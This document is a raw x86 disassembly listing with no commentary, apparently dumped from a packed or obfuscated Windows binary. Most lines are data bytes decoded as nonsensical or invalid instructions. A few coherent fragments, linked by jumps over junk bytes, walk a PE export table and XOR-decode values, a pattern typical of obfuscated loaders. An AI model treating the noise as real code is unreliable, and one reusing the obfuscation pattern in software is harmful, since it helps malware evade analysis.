  40ae0e:	mov    BYTE PTR [ebx],dh
  40ae10:	test   BYTE PTR [edi+0x431f36d2],cl
  40ae16:	mov    ebp,0x2f8a2637
  40ae1b:	loope  0x40ada1
  40ae1d:	inc    ebx
  40ae1e:	or     DWORD PTR [ebx],edi
  40ae20:	dec    esi
  40ae21:	push   0x904392b9
  40ae26:	arpl   bp,sp
  40ae28:	sub    dl,BYTE PTR [eax-0x54]
  40ae2b:	sbb    al,0x31
  40ae2d:	cdq    
  40ae2e:	out    dx,al
  40ae2f:	xchg   edx,eax
  40ae30:	sbb    eax,0xc1289444
  40ae35:	adc    ebx,DWORD PTR [esi]
  40ae37:	lea    ecx,[esi+0x18692e49]
  40ae3d:	iret   
  40ae3e:	and    edi,ecx
  40ae40:	lods   al,BYTE PTR ds:[esi]
  40ae41:	mov    cl,0x3b
  40ae43:	rcr    cl,1
  40ae45:	mov    cl,0xb6
  40ae47:	dec    eax
  40ae48:	inc    ebp
  40ae49:	mov    bh,0x4
  40ae4b:	data16 xor BYTE PTR [ebp+edi*8+0x9],dh
  40ae50:	xchg   esi,eax
  40ae51:	es mov eax,0xaa0d827e
  40ae57:	jns    0x40ae03
  40ae59:	lock mov cl,0x6a
  40ae5c:	stos   DWORD PTR es:[edi],eax
  40ae5d:	pop    ss
  40ae5e:	adc    DWORD PTR [eax],edx
  40ae60:	cmp    al,0x55
  40ae62:	bound  ebp,QWORD PTR [ebp-0x73e5134]
  40ae68:	pop    es
  40ae69:	mov    edi,0xc665b64b
  40ae6e:	xor    ebp,DWORD PTR [esi+ebx*2-0x344856b4]
  40ae75:	add    al,0x94
  40ae77:	popf   
  40ae78:	ins    DWORD PTR es:[edi],dx
  40ae79:	mov    ebx,DWORD PTR [ecx]
  40ae7b:	stc    
  40ae7c:	xchg   edx,eax
  40ae7d:	fs pop es
  40ae7f:	pusha  
  40ae80:	ret    
  40ae81:	out    dx,al
  40ae82:	mov    ds:0xbc7f63a8,eax
  40ae87:	fcomp  QWORD PTR [eax+0x36af2ba8]
  40ae8d:	mov    esp,0x61d0debc
  40ae92:	test   al,0xfe
  40ae94:	dec    esp
  40ae95:	push   ebp
  40ae96:	mov    ?,ebp
  40ae98:	fnsave [edi-0xf0bf9ba]
  40ae9e:	push   edx
  40ae9f:	xlat   BYTE PTR ds:[ebx]
  40aea0:	adc    DWORD PTR [ecx],eax
  40aea2:	jg     0x40aebd
  40aea4:	push   edx
  40aea5:	addr16 xchg ecx,eax
  40aea7:	loopne 0x40aeb0
  40aea9:	sub    ah,al
  40aeab:	test   DWORD PTR [eax+ebp*2-0x6f55febc],ecx
  40aeb2:	jge    0x40aec4
  40aeb4:	jl     0x40aecb
  40aeb6:	and    ch,dh
  40aeb8:	mov    dl,0xe8
  40aeba:	add    esi,DWORD PTR [edi-0x18]
  40aebd:	(bad)  [edx+0x5]
  40aec0:	(bad)  
  40aec1:	push   ds
  40aec2:	xor    eax,0x6c1bb488
  40aec7:	bound  eax,QWORD PTR [ecx+0x6ce0b4eb]
  40aecd:	sbb    bh,BYTE PTR [edx-0x4d0b4cf2]
  40aed3:	push   ds
  40aed4:	dec    esp
  40aed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed6:	jmp    0x8855:0xf3ced374
  40aedd:	stos   BYTE PTR es:[edi],al
  40aede:	jge    0x40af32
  40aee0:	stos   BYTE PTR es:[edi],al
  40aee1:	clc    
  40aee2:	cmp    DWORD PTR [eax+0x41],esi
  40aee5:	xor    dl,BYTE PTR [esi-0x7bc61947]
  40aeeb:	mov    ecx,DWORD PTR [ebp+0xc]
  40aeee:	xor    eax,esi
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	jmp    0x70ea:0x4667bfe2
  40af70:	jo     0x40af07
  40af72:	jg     0x40afe4
  40af74:	jo     0x40af9d
  40af76:	int    0xe1
  40af78:	jbe    0x40af3d
  40af7a:	in     al,dx
  40af7b:	push   edx
  40af7c:	out    dx,al
  40af7d:	fdivr  QWORD PTR [ebx-0x5b]
  40af80:	pop    ecx
  40af81:	add    ah,cl
  40af83:	sub    dl,BYTE PTR ds:0x7d545fcd
  40af89:	loope  0x40af5b
  40af8b:	dec    esi
  40af8c:	xor    al,0x24
  40af8e:	out    0xde,eax
  40af90:	sub    al,0x1e
  40af92:	add    DWORD PTR [ecx+0x57d75fdc],ebp
  40af98:	xchg   edi,eax
  40af99:	lea    esi,ds:[eax+0x735d0123]
  40afa0:	jecxz  0x40af92
  40afa2:	pop    edi
  40afa3:	add    eax,0x823e9dd8
  40afa8:	bound  ecx,QWORD PTR [ecx]
  40afaa:	fsubr  QWORD PTR [esi+0x56]
  40afad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afae:	(bad)  
  40afaf:	jns    0x40afee
  40afb1:	pop    eax
  40afb2:	push   0x434d3bcf
  40afb7:	mov    bl,0x6a
  40afb9:	mov    cl,0x14
  40afbb:	or     BYTE PTR [ebx],ch
  40afbd:	jecxz  0x40afd2
  40afbf:	pop    edi
  40afc0:	ror    BYTE PTR [edx],1
  40afc2:	call   0xc54e:0x4aaf475d
  40afc9:	call   0x75f468af
  40afce:	stos   BYTE PTR es:[edi],al
  40afcf:	lods   al,BYTE PTR ds:[esi]
  40afd0:	fcom   st(0)
  40afd2:	setl   BYTE PTR [esi+0x7]
  40afd6:	mov    esp,0xee8ef96f
  40afdb:	cwde   
  40afdc:	jle    0x40b015
  40afde:	xor    DWORD PTR [ecx],esp
  40afe0:	jle    0x40afdd
  40afe2:	rcr    DWORD PTR [ebx+ebx*2],cl
  40afe5:	mov    WORD PTR [esi],?
  40afe7:	jp     0x40b022
  40afe9:	xchg   bh,dh
  40afeb:	push   edi
  40afec:	stc    
  40afed:	lock add DWORD PTR [ecx],ebx
  40aff0:	push   esi
  40aff1:	cld    
  40aff2:	jae    0x40b034
  40aff4:	je     0x40afe9
  40aff6:	mov    ah,0xdc
  40aff8:	ds jge 0x40b057
  40affb:	and    ah,BYTE PTR [esi]
  40affd:	std    
  40affe:	cli    
  40afff:	inc    ecx
  40b000:	cmp    eax,0x8b3603f1
  40b005:	mov    dh,0x89
  40b007:	data16 mov cl,0x3b
  40b00a:	imul   ebx,DWORD PTR [edx+0x341d290e],0x3f
  40b011:	stos   DWORD PTR es:[edi],eax
  40b012:	mov    al,0x45
  40b014:	es push edx
  40b016:	sahf   
  40b017:	fcomp  QWORD PTR [eax+0x5b]
  40b01a:	ins    DWORD PTR es:[edi],dx
  40b01b:	and    ah,BYTE PTR [edx-0x13]
  40b01e:	pop    ebp
  40b01f:	cmp    eax,0xd690488a
  40b024:	or     DWORD PTR [ebx-0x2823afb8],ecx
  40b02a:	loop   0x40b050
  40b02c:	icebp  
  40b02d:	bound  esp,QWORD PTR [ebx+0x2bf22150]
  40b033:	jo     0x40afeb
  40b035:	mov    ebp,0xcfa607d3
  40b03a:	mov    ecx,0x22e5260a
  40b03f:	int3   
  40b040:	or     DWORD PTR [ecx+0x17],edx
  40b043:	shl    eax,1
  40b045:	retf   0x8fc1
  40b048:	push   0x8efea46d
  40b04d:	out    0xa6,eax
  40b04f:	and    DWORD PTR [edx+0x38],esi
  40b052:	push   ds
  40b053:	fdiv   QWORD PTR [ecx-0x1211b35]
  40b059:	dec    esp
  40b05a:	enter  0x1d8,0x24
  40b05e:	jp     0x40afe2
  40b060:	push   ebp
  40b061:	mov    ebp,0x81068941
  40b066:	shl    BYTE PTR [esi+0x15],1
  40b069:	jl     0x40b08c
  40b06b:	cmp    eax,0x85843694
  40b070:	dec    ecx
  40b071:	jns    0x40b074
  40b073:	into   
  40b074:	xchg   edi,eax
  40b075:	jbe    0x40b076
  40b077:	aas    
  40b078:	mov    WORD PTR [esi],?
  40b07a:	retf   
  40b07b:	xchg   esi,eax
  40b07c:	dec    eax
  40b07d:	in     eax,0x81
  40b07f:	dec    esi
  40b080:	dec    esi
  40b081:	sub    ah,BYTE PTR [ecx+0x64]
  40b084:	xchg   edx,eax
  40b085:	adc    edx,edx
  40b087:	xchg   ecx,eax
  40b088:	mov    ecx,0x7631f472
  40b08d:	adc    eax,0x77276212
  40b092:	xchg   esi,eax
  40b093:	jnp    0x40b031
  40b095:	popf   
  40b096:	mov    eax,DWORD PTR fs:[esi+0x65]
  40b09a:	ret    0x7d8f
  40b09d:	push   ss
  40b09e:	neg    BYTE PTR [ebp-0x776f890d]
  40b0a4:	aad    0x68
  40b0a6:	data16 stos BYTE PTR es:[di],al
  40b0a9:	cdq    
  40b0aa:	mov    edi,DWORD PTR ds:0xede35404
  40b0b0:	(bad)  
  40b0b1:	scas   al,BYTE PTR es:[edi]
  40b0b2:	mov    dl,ah
  40b0b4:	cdq    
  40b0b5:	jae    0x40b06f
  40b0b7:	cmp    BYTE PTR [ecx],cl
  40b0b9:	scas   eax,DWORD PTR es:[edi]
  40b0ba:	jmp    0xfec3:0x95979ce6
  40b0c1:	repz ret 0x2350
  40b0c5:	mov    ebx,0xafb5df9b
  40b0ca:	dec    ebx
  40b0cb:	shl    DWORD PTR [esi],0x96
  40b0ce:	popa   
  40b0cf:	mov    WORD PTR [eax-0x411b0b80],ss
  40b0d5:	sbb    dh,cl
  40b0d7:	or     BYTE PTR [esi+eiz*2+0x6a],cl
  40b0db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0dc:	fcomp  DWORD PTR [edx]
  40b0de:	pop    esi
  40b0df:	test   DWORD PTR [ebp-0x39],ebp
  40b0e2:	mov    DWORD PTR [ebx],ebp
  40b0e4:	retf   
  40b0e5:	push   edi
  40b0e6:	mov    bl,BYTE PTR [eax+ecx*8-0x2c93fa53]
  40b0ed:	mov    ecx,0x501673f0
  40b0f2:	(bad)  
  40b0f3:	es xor DWORD PTR es:[edi+esi*1+0x22],ebp
  40b0f9:	jecxz  0x40b140
  40b0fb:	ror    DWORD PTR [ecx-0x27],0x5f
  40b0ff:	xor    eax,0xb26008de
  40b104:	dec    edx
  40b105:	in     al,0x39
  40b107:	jno    0x40b0c5
  40b109:	jae    0x40b114
  40b10b:	jbe    0x40b0b1
  40b10d:	mov    ah,0xcb
  40b10f:	xor    DWORD PTR [ebx+0x458be84d],ecx
  40b115:	clc    
  40b116:	mov    eax,DWORD PTR [eax]
  40b118:	mov    eax,DWORD PTR [eax+0x3c]
  40b11b:	lea    ecx,[ecx*8+0x78]
  40b122:	add    eax,ecx
  40b124:	mov    ecx,DWORD PTR [ebp-0x8]
  40b127:	mov    ecx,DWORD PTR [ecx]
  40b129:	mov    eax,DWORD PTR [eax+ecx*1]
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	mov    ah,0xaf
  40b149:	hlt    
  40b14a:	jns    0x40b127
  40b14c:	call   0x7fd621c1
  40b151:	jo     0x40b1c3
  40b153:	cmp    eax,0xfa1d9860
  40b158:	push   0xad8a9e52
  40b15d:	jge    0x40b11d
  40b15f:	arpl   bx,ax
  40b161:	sub    dl,BYTE PTR [ebp+0x2eec9488]
  40b167:	xor    ecx,DWORD PTR ds:[ebx-0x46369167]
  40b16e:	fmul   DWORD PTR ds:[esi+0x77]
  40b172:	jne    0x40b19e
  40b174:	das    
  40b175:	or     cl,BYTE PTR [ebp-0x18]
  40b178:	ja     0x40b1d0
  40b17a:	jns    0x40b17f
  40b17c:	add    edx,ecx
  40b17e:	dec    ebx
  40b17f:	mov    dl,0x7e
  40b181:	mov    al,0xf2
  40b183:	call   FWORD PTR [esi+0x54]
  40b186:	adc    al,0x58
  40b188:	add    dh,al
  40b18a:	inc    eax
  40b18b:	setge  BYTE PTR [eax]
  40b18e:	std    
  40b18f:	dec    ebx
  40b190:	or     bl,al
  40b192:	nop
  40b193:	dec    edx
  40b194:	cmp    BYTE PTR [ebx],dh
  40b196:	cs int3 
  40b198:	das    
  40b199:	jp     0x40b1a8
  40b19b:	sub    al,BYTE PTR [esi]
  40b19d:	fwait
  40b19e:	dec    edi
  40b19f:	jns    0x40b1e6
  40b1a1:	aaa    
  40b1a2:	xor    DWORD PTR ds:0x6258ac22,esp
  40b1a8:	cdq    
  40b1a9:	pusha  
  40b1aa:	jbe    0x40b21b
  40b1ac:	sahf   
  40b1ad:	inc    edi
  40b1ae:	sbb    bh,bl
  40b1b0:	sbb    ch,BYTE PTR [ebx+0x72]
  40b1b3:	mov    WORD PTR ds:0x69e393c,fs
  40b1b9:	int    0x15
  40b1bb:	gs aaa 
  40b1bd:	cmp    eax,0x12bef613
  40b1c2:	push   0x935779f2
  40b1c7:	pop    ebx
  40b1c8:	mov    ah,0x5a
  40b1ca:	lock push edx
  40b1cc:	lea    ebx,[eax]
  40b1ce:	test   DWORD PTR [ebp-0x306ff09],eax
  40b1d4:	sbb    edx,edi
  40b1d6:	adc    dh,bh
  40b1d8:	or     DWORD PTR [ecx],0x46
  40b1db:	sahf   
  40b1dc:	pop    ss
  40b1dd:	test   BYTE PTR [ebp+0x9944361],dl
  40b1e3:	jnp    0x40b210
  40b1e5:	rol    BYTE PTR [eax+ecx*8-0x27f80d06],cl
  40b1ec:	aam    0x9c
  40b1ee:	mov    ebx,0x1ce5b262
  40b1f3:	loop   0x40b23b
  40b1f5:	rcr    DWORD PTR [esi-0x1c8471e],1
  40b1fb:	fild   QWORD PTR [eax+0x255b7ad5]
  40b201:	jb     0x40b1e3
  40b203:	pop    es
  40b204:	loopne 0x40b265
  40b206:	sbb    BYTE PTR [ebp+0x1033ed64],bl
  40b20c:	lods   al,BYTE PTR ds:[esi]
  40b20d:	sbb    eax,0xe685318d
  40b212:	ret    
  40b213:	xor    edx,esp
  40b215:	aas    
  40b216:	jmp    0x40b264
  40b218:	scas   eax,DWORD PTR es:[edi]
  40b219:	mov    al,ds:0x68998d2
  40b21e:	je     0x40b21d
  40b220:	fidiv  WORD PTR [ebx-0x561aca4f]
  40b226:	pop    esp
  40b227:	mov    dl,0x2d
  40b229:	cmp    cl,BYTE PTR [eax+0x30]
  40b22c:	sub    al,0xe
  40b22e:	cmp    DWORD PTR [edi],ebp
  40b230:	call   0x5ecd:0xfe953e
  40b237:	jp     0x40b2ad
  40b239:	test   BYTE PTR [edi+0x28],dh
  40b23c:	sub    edx,DWORD PTR [ecx-0xe]
  40b23f:	loopne 0x40b2a6
  40b241:	and    BYTE PTR [edx-0x5dfda10e],al
  40b247:	cmc    
  40b248:	pushf  
  40b249:	or     BYTE PTR ds:0x3c0544b0,dh
  40b24f:	dec    ecx
  40b250:	sbb    BYTE PTR [eax-0x92509cc],cl
  40b256:	loopne 0x40b2b3
  40b258:	and    esp,DWORD PTR [edx-0x266052c5]
  40b25e:	mov    eax,ds:0x421446dd
  40b263:	cld    
  40b264:	xor    ch,bl
  40b266:	pushf  
  40b267:	xor    dl,BYTE PTR [eax-0x20936ca1]
  40b26d:	je     0x40b2b4
  40b26f:	aaa    
  40b270:	inc    eax
  40b271:	sahf   
  40b272:	push   ds
  40b273:	test   BYTE PTR es:[edx],0x33
  40b277:	jnp    0x40b2f4
  40b279:	inc    edi
  40b27a:	test   al,dl
  40b27c:	int    0xc
  40b27e:	lods   eax,DWORD PTR ds:[esi]
  40b27f:	(bad)
  40b283:	or     al,0xb3
  40b285:	dec    edi
  40b286:	sbb    BYTE PTR [eax-0x4],ch
  40b289:	adc    al,0x19
  40b28b:	dec    ebp
  40b28c:	int3   
  40b28d:	xor    ch,ah
  40b28f:	and    eax,0x410004db
  40b294:	mov    cl,0xa4
  40b296:	jns    0x40b2c9
  40b298:	int3   
  40b299:	cmp    DWORD PTR [ebp+ebp*1-0x4688016c],ecx
  40b2a0:	push   cs
  40b2a1:	cmp    eax,0xfcb940d1
  40b2a6:	add    edx,DWORD PTR [ebx]
  40b2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a9:	cmp    BYTE PTR [edx+0x7d],cl
  40b2ac:	shl    esp,1
  40b2ae:	(bad)  
  40b2b0:	fwait
  40b2b1:	clc    
  40b2b2:	dec    ecx
  40b2b3:	push   ebp
  40b2b4:	and    al,0xea
  40b2b6:	fwait
  40b2b7:	mov    ds:0x84f2f266,eax
  40b2bc:	xchg   edx,eax
  40b2bd:	ret    
  40b2be:	(bad)  
  40b2c0:	js     0x40b259
  40b2c2:	retf   0x82d
  40b2c5:	ret    
  40b2c6:	ja     0x40b256
  40b2c8:	mov    fs,WORD PTR [eax]
  40b2ca:	cmp    BYTE PTR [esi],ah
  40b2cc:	(bad)  
  40b2cd:	pop    ebx
  40b2ce:	add    BYTE PTR [eax],bl
  40b2d0:	fcomp  DWORD PTR [ebx]
  40b2d2:	inc    eax
  40b2d3:	test   DWORD PTR [esi],0xe8a8afa5
  40b2d9:	sub    dh,BYTE PTR [edi-0x33]
  40b2dc:	(bad)  
  40b2dd:	lea    eax,[edx]
  40b2df:	fisttp DWORD PTR [esi-0x5d]
  40b2e2:	adc    dh,bh
  40b2e4:	outs   dx,BYTE PTR ds:[esi]
  40b2e5:	dec    esp
  40b2e6:	into   
  40b2e7:	outs   dx,BYTE PTR ds:[esi]
  40b2e8:	je     0x40b2a8
  40b2ea:	addr16 mov ch,0x49
  40b2ed:	xchg   edx,eax
  40b2ee:	mov    DWORD PTR [ebp-0x24],eax
  40b2f1:	jmp    0x40b4a9
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0x5fdbadc9
  40b303:	adc    eax,0xf67084b2
  40b308:	jo     0x40b37a
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b32e
  40b30f:	jae    0x40b2d9
  40b311:	jno    0x40b2e1
  40b313:	add    al,0x23
  40b315:	dec    ebx
  40b316:	test   BYTE PTR [ebx+0x53e44f15],dh
  40b31c:	(bad)  
  40b31d:	push   0x1a
  40b31f:	or     DWORD PTR [ebx],ebx
  40b321:	pop    edx
  40b322:	in     al,dx
  40b323:	jmp    DWORD PTR [esi+eax*8+0x58172f6]
  40b32a:	dec    edi
  40b32b:	hlt    
  40b32c:	pop    ds
  40b32d:	jge    0x40b32a
  40b32f:	or     esp,edi
  40b331:	mov    ecx,0xfd5f1906
  40b336:	lahf   
  40b337:	push   ebp
  40b338:	pop    esp
  40b339:	stc    
  40b33a:	bswap  edi
  40b33c:	mov    cl,0xef
  40b33e:	pmaddwd mm4,mm1
  40b341:	mov    al,BYTE PTR [ebx]
  40b343:	pop    ss
  40b344:	int3   
  40b345:	sub    eax,0xd3e7e497
  40b34a:	fadd   DWORD PTR [esi+eax*2]
  40b34d:	test   al,0xfe
  40b34f:	xchg   edi,eax
  40b350:	xchg   esi,eax
  40b351:	dec    ebx
  40b352:	ds (bad) 
  40b354:	out    0xa4,eax
  40b356:	adc    dl,cl
  40b358:	das    
  40b359:	and    al,0x5f
  40b35b:	ficom  DWORD PTR [edx+0x3a130907]
  40b361:	clc    
  40b362:	dec    eax
  40b363:	and    BYTE PTR [esi],ah
  40b365:	cmc    
  40b366:	ja     0x40b31f
  40b368:	rol    bh,0x73
  40b36b:	les    edx,FWORD PTR [eax+0x49]
  40b36e:	in     al,0x12
  40b370:	ror    BYTE PTR [eax],cl
  40b372:	sub    bh,BYTE PTR [ecx]
  40b374:	push   eax
  40b375:	jmp    0x467b:0x3b34572c
  40b37c:	dec    ecx
  40b37d:	sahf   
  40b37e:	ret    0x476e
  40b381:	dec    esi
  40b382:	push   es
  40b383:	add    bh,BYTE PTR ds:0x47e688a2
  40b389:	std    
  40b38a:	add    eax,DWORD PTR [esp+edx*1-0x7d]
  40b38e:	mov    ah,0xf2
  40b390:	(bad)  
  40b391:	shl    BYTE PTR [ecx],1
  40b393:	fadd   QWORD PTR [eax]
  40b395:	mov    ch,0x5d
  40b397:	cwde   
  40b398:	into   
  40b399:	cmp    al,0x6f
  40b39b:	shl    bl,0xd0
  40b39e:	rol    DWORD PTR [ecx+0x43],1
  40b3a1:	rcr    DWORD PTR ds:[eax+edx*2+0x2b],cl
  40b3a6:	mov    ah,0x9e
  40b3a8:	data16 xor BYTE PTR [ecx-0x61],dh
  40b3ac:	fild   DWORD PTR [eax+0x69]
  40b3af:	cmp    al,0x88
  40b3b1:	bound  eax,QWORD PTR [esi+0x3f]
  40b3b4:	pop    ss
  40b3b5:	xchg   esi,eax
  40b3b6:	pop    eax
  40b3b7:	push   eax
  40b3b8:	dec    ebp
  40b3b9:	cli    
  40b3ba:	(bad)  
  40b3bb:	cmc    
  40b3bc:	jns    0x40b423
  40b3be:	cs dec esp
  40b3c0:	fiadd  WORD PTR [edi-0x54]
  40b3c3:	pop    edi
  40b3c4:	or     dh,BYTE PTR [ebp+0x60f8109b]
  40b3ca:	out    dx,al
  40b3cb:	cdq    
  40b3cc:	sbb    ebp,DWORD PTR [ebp+0x5d74064a]
  40b3d2:	fwait
  40b3d3:	inc    ebx
  40b3d4:	and    bh,BYTE PTR [ecx+0x7f]
  40b3d7:	add    ecx,DWORD PTR [edx+0x5eed0620]
  40b3dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3de:	lea    edi,[esi]
  40b3e0:	pop    ds
  40b3e1:	in     eax,dx
  40b3e2:	popf   
  40b3e3:	shl    bl,1
  40b3e5:	lea    eax,[ebp-0x34cb644b]
  40b3eb:	add    eax,0x46006894
  40b3f0:	mov    al,ds:0x2b92cb6d
  40b3f5:	aad    0x71
  40b3f7:	test   esi,eax
  40b3f9:	aas    
  40b3fa:	add    eax,0x758fb44b
  40b3ff:	ror    DWORD PTR [ecx],1
  40b401:	out    dx,eax
  40b402:	outs   dx,DWORD PTR ds:[esi]
  40b403:	pop    edx
  40b404:	stc    
  40b405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b406:	inc    esi
  40b407:	and    BYTE PTR [edx],bh
  40b409:	fdivr  DWORD PTR [ebp+0x44]
  40b40c:	cmc    
  40b40d:	and    al,0x42
  40b40f:	leave  
  40b410:	loop   0x40b429
  40b412:	push   ebp
  40b413:	(bad)  
  40b414:	rcl    ah,cl
  40b416:	xor    al,0x21
  40b418:	pushf  
  40b419:	out    dx,al
  40b41a:	inc    ecx
  40b41b:	nop
  40b41c:	adc    DWORD PTR [ebx-0x6c],ecx
  40b41f:	push   ds
  40b420:	stos   DWORD PTR es:[edi],eax
  40b421:	and    ch,bh
  40b423:	not    ch
  40b425:	fstp   QWORD PTR [ebx-0x8117d2]
  40b42b:	iret   
  40b42c:	cmp    DWORD PTR [edi+0x3caa717e],ebp
  40b432:	bound  eax,QWORD PTR [eax+0x7aa934df]
  40b438:	nop
  40b439:	cld    
  40b43a:	retf   0x1ab1
  40b43d:	scas   eax,DWORD PTR es:[edi]
  40b43e:	repnz sar BYTE PTR [edx],1
  40b441:	(bad)  
  40b442:	js     0x40b3f6
  40b444:	hlt    
  40b445:	je     0x40b3d6
  40b447:	outs   dx,DWORD PTR ds:[esi]
  40b448:	inc    ebp
  40b449:	adc    BYTE PTR [edi+0x472b1ed2],ah
  40b44f:	scas   al,BYTE PTR es:[edi]
  40b450:	pop    edx
  40b451:	jl     0x40b3ff
  40b453:	pushf  
  40b454:	inc    esi
  40b455:	mov    al,ds:0x623ac1af
  40b45a:	jge    0x40b46a
  40b45c:	je     0x40b44f
  40b45e:	iret   
  40b45f:	popf   
  40b460:	add    DWORD PTR [edx],0xffffffe5
  40b463:	cmp    eax,0x4c480e9b
  40b468:	add    edi,DWORD PTR [esi-0x17]
  40b46b:	sbb    bh,BYTE PTR [eax]
  40b46d:	or     al,0xe0
  40b46f:	fadd   DWORD PTR [esi+0x5439a7dc]
  40b475:	jg     0x40b40c
  40b477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b478:	ins    BYTE PTR es:[edi],dx
  40b479:	mov    ebp,0xeda13480
  40b47e:	test   eax,0xcd07a425
  40b483:	ins    DWORD PTR es:[edi],dx
  40b484:	stos   BYTE PTR es:[edi],al
  40b485:	dec    ebp
  40b486:	and    edi,DWORD PTR [esi]
  40b488:	lock xor DWORD PTR [edx+edx*2-0x64],ebx
  40b48d:	retf   0x6b96
  40b490:	xlat   BYTE PTR ds:[ebx]
  40b491:	stos   DWORD PTR es:[edi],eax
  40b492:	add    ebp,DWORD PTR es:[ecx-0x6d]
  40b496:	inc    ebx
  40b497:	mov    ebx,DWORD PTR [eax+0x6e]
  40b49a:	stos   DWORD PTR es:[edi],eax
  40b49b:	rcr    DWORD PTR ds:0x3c5999fd,0x4c
  40b4a2:	in     al,dx
  40b4a3:	or     BYTE PTR [edx+0x28359967],bl
  40b4a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b4ac:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4af:	xor    eax,esi
  40b4b1:	add    eax,edi
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0x2a413075
  40b4de:	dec    esi
  40b4df:	iret   
  40b4e0:	mov    al,0x95
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b4b2
  40b4ea:	(bad)  
  40b4eb:	push   ss
  40b4ec:	jns    0x40b558
  40b4ee:	xor    eax,DWORD PTR [ecx+eiz*1+0x6083f57f]
  40b4f5:	jge    0x40b501
  40b4f7:	test   eax,0xb40931a4
  40b4fc:	jle    0x40b56b
  40b4fe:	jmp    0x41a5f482
  40b503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b504:	shl    BYTE PTR [ebp+0x38],1
  40b507:	outs   dx,DWORD PTR ds:[esi]
  40b508:	popa   
  40b509:	jl     0x40b536
  40b50b:	das    
  40b50c:	mov    eax,ds:0x8dd956ad
  40b511:	mov    dl,0x71
  40b513:	sub    BYTE PTR [edi],dh
  40b515:	fdiv   DWORD PTR [esi-0x6f159ed9]
  40b51b:	add    edi,DWORD PTR [esi+0x2]
  40b51e:	pop    ebp
  40b51f:	retf   
  40b520:	or     al,0x51
  40b522:	mov    WORD PTR [edi+0x4],cs
  40b525:	arpl   bp,di
  40b527:	mov    ds,esi
  40b529:	xor    al,ch
  40b52b:	push   edx
  40b52c:	scas   al,BYTE PTR es:[edi]
  40b52d:	xchg   bp,ax
  40b52f:	mov    al,ds:0x2aa6b9e7
  40b534:	push   esp
  40b535:	loopne 0x40b581
  40b537:	leave  
  40b538:	iret   
  40b539:	shr    bl,1
  40b53b:	(bad)  [ebp-0x7bf51c7a]
  40b541:	jmp    0x78e6a25f
  40b546:	jo     0x40b502
  40b548:	fnstenv [esi]
  40b54a:	or     DWORD PTR [ebx+0x4f2bfea2],edx
  40b550:	fcmovbe st,st(7)
  40b552:	outs   dx,BYTE PTR ds:[esi]
  40b553:	rol    BYTE PTR [edi+ebx*1-0x5],1
  40b557:	add    eax,0x7774cc9c
  40b55c:	push   ss
  40b55d:	xchg   ebp,eax
  40b55e:	push   ebx
  40b55f:	(bad)  [edi-0x106d58d]
  40b565:	vpmacssdd ymm3,ymm3,YMMWORD PTR ss:[bx+di],ymm4
  40b56d:	jg     0x40b53d
  40b56f:	and    ebx,ebx
  40b571:	js     0x40b57e
  40b573:	sub    al,0x59
  40b575:	add    ch,0x1b
  40b578:	or     al,0xe4
  40b57a:	(bad)  
  40b57c:	pop    ecx
